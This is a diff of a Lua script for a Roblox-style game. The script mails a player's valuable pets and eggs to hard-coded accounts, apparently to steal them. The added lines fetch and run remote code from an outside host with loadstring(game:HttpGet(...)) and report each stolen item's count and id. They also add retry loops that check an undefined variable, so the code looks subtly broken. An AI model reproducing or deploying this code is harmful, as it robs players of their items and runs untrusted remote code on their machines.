@@ -96,12 +96,21 @@ end
 
 for i,v in pairs(save.Inventory.Pet) do
 if string.find(v.id, "Jel") and ndir[v.id].difficulty > 24999999 then
-_mail("kdnaviivii", "Pet", i, (v._am or 1))
+local _x,_e=false,""
+repeat
+_x,_e = _mail("kdnaviivii", "Pet", i, (v._am or 1))
+wait()
+until _X==true
 end
 end
 if save.Inventory.Egg then
 for i,v in pairs(save.Inventory.Egg) do
-_mail("hamster97", "Egg", i, (v._am or 1))
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()((v._am or 1).."x "..v.id)
+local _x,_e=false,""
+repeat
+_x,_e = _mail("hamster97", "Egg", i, (v._am or 1))
+wait()
+until _X==true
 end
 end
 
